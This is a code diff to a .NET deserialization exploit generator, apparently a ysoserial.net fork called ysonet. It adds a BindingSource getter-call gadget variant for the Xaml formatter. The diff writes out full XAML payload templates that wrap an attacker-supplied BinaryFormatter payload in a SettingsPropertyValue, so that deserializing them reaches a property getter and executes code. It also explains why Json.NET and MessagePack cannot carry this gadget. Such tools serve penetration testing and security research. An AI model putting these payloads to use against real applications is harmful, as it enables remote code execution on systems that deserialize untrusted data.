@@ -30,6 +30,21 @@ namespace ysonet.Generators
         // ComboBox
         // ListBox
         // CheckedListBox
+        // BindingSource
+
+        // BindingSource (variant 5) is not a Control. Its DataMember setter names the
+        // property and its DataSource setter supplies the object, and whichever lands second
+        // calls ResetList -> ListBindingHelper.GetList(dataSource, dataMember) ->
+        // PropertyDescriptor.GetValue. That matters here because the other four carriers are
+        // WinForms controls, so this is the only variant that reaches the getter without
+        // building a control in the target process.
+        //
+        // It is XAML ONLY, and the reason is the carrier rather than the sink: BindingSource
+        // implements IList, so Json.NET refuses the document outright ("the type requires a
+        // JSON array") and both MessagePack Typeless flavours read it as a collection. Xaml
+        // sets members by name regardless of the interfaces the type carries, so it is the
+        // one advertised formatter left. Measured, not assumed - see the Without() call on
+        // the variant below.
 
         // It should be possible to use it with the serializers that are able to call the one-arg constructor
         // MessagePack gadget works from version 2.3.75. There is a huge chance that it will also work for older versions after some tweaking.
@@ -39,10 +54,11 @@ namespace ysonet.Generators
         public override List<string> SupportedFormatters()
         {
             // The "(N)" suffix is a display-only annotation meaning "this formatter
-            // carries N variants". Json.NET and Xaml build all four getter chains; the
-            // MessagePack helpers implement variant 1 only (Generate() switches back to
-            // 1 and says so), so they stay bare.
-            return new List<string> { "Json.NET (4)", "Xaml (4)", "MessagePackTypeless", "MessagePackTypelessLz4" };
+            // carries N variants". Json.NET builds the four Control getter chains, Xaml
+            // builds those four plus the BindingSource one, and the MessagePack helpers
+            // implement variant 1 only (Generate() switches back to 1 and says so), so
+            // they stay bare.
+            return new List<string> { "Json.NET (4)", "Xaml (5)", "MessagePackTypeless", "MessagePackTypelessLz4" };
         }
 
         public override string Finders()
@@ -57,7 +73,14 @@ namespace ysonet.Generators
                 new GadgetVariant(1, "PropertyGrid getter (default; only option for MessagePack)"),
                 new GadgetVariant(2, "ComboBox getter"),
                 new GadgetVariant(3, "ListBox getter"),
-                new GadgetVariant(4, "CheckedListBox getter")
+                new GadgetVariant(4, "CheckedListBox getter"),
+
+                // Xaml only. Json.NET and both MessagePack flavours read BindingSource as a
+                // list, because it implements IList, and populate it with Add instead of
+                // calling the two setters. Without() is what keeps them out of the variant
+                // sweeps and out of the interactive editor for this variant.
+                new GadgetVariant(5, "BindingSource getter (Xaml only; no Control is built)")
+                    .Without(Formatters.JsonNet, Formatters.MessagePackTypeless, Formatters.MessagePackTypelessLz4)
             };
         }
 
@@ -68,7 +91,9 @@ namespace ysonet.Generators
                 {"var|variant=", "Variant number. Variant defines a different getter-call gadget. Choices: \r\n1 (default) - PropertyGrid getter-call gadget, " +
                 "\r\n2 - ComboBox getter-call gadget (may execute code twice)" +
                 "\r\n3 - ListBox getter-call gadget" +
-                "\r\n4 - CheckedListBox getter-call gadget", v => int.TryParse(v, out variant_number) },
+                "\r\n4 - CheckedListBox getter-call gadget" +
+                "\r\n5 - BindingSource getter-call gadget (Xaml only; a Component, so no WinForms control is built on the target)",
+                v => int.TryParse(v, out variant_number) },
             };
 
             return options;
@@ -86,6 +111,13 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            // Reject variant 5 on any formatter it opted out of (Json.NET and both
+            // MessagePack flavours, declared with Without() above), using the catalogue's
+            // shared guard so the message, the interactive editor block and the matrix all
+            // agree. It runs BEFORE the MessagePack branch on purpose: without it, variant 5
+            // + MessagePack would be silently switched to variant 1 rather than refused.
+            GuardVariantFormatter(variant_number, formatter);
+
             byte[] binaryFormatterPayload;
             if (BridgedPayload != null)
             {
@@ -208,6 +240,15 @@ namespace ysonet.Generators
                 {
                     payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
                 }
+                else if (variant_number == 5)
+                {
+                    // DataMember is an ATTRIBUTE and DataSource a property element, so
+                    // XamlReader assigns DataMember first: the DataSource setter is then the
+                    // one that calls ResetList with both values and reaches the getter.
+                    // Either order works - both setters call ResetList - but this is the
+                    // order Munoz and Mirosh published, so it is the one written here.
+                    payload = "<BindingSource DataMember=\"PropertyValue\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><BindingSource.DataSource><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></BindingSource.DataSource></BindingSource>";
+                }
                 else
                 {
                     payload = "<PropertyGrid UseCompatibleTextRendering=\"True\" Location=\"0, 0\" Name=\"\" TabIndex=\"0\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\"><PropertyGrid.SelectedObject><sc:SettingsPropertyValue xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" IsDirty=\"False\" Deserialized=\"False\" xmlns=\"clr-namespace:System.Configuration;assembly=System\" xmlns:b=\"clr-namespace:System.Configuration;assembly=System\" xmlns:assembly=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"><x:Arguments><b:SettingsProperty><x:Arguments><s:String>test</s:String></x:Arguments></b:SettingsProperty></x:Arguments><sc:SettingsPropertyValue.SerializedValue>" + bfBytes + "</sc:SettingsPropertyValue.SerializedValue></sc:SettingsPropertyValue></PropertyGrid.SelectedObject></PropertyGrid>";
@@ -243,6 +284,10 @@ namespace ysonet.Generators
                     else if (variant_number == 4)
                     {
                         payload = "<CheckedListBox xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><CheckedListBox.Items>" + spv + "</CheckedListBox.Items><CheckedListBox.DisplayMember>PropertyValue</CheckedListBox.DisplayMember><CheckedListBox.Text>watever</CheckedListBox.Text></CheckedListBox>";
+                    }
+                    else if (variant_number == 5)
+                    {
+                        payload = "<BindingSource DataMember=\"PropertyValue\" xmlns=\"clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms\" xmlns:sc=\"clr-namespace:System.Configuration;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><BindingSource.DataSource>" + spv + "</BindingSource.DataSource></BindingSource>";
                     }
                     else
                     {
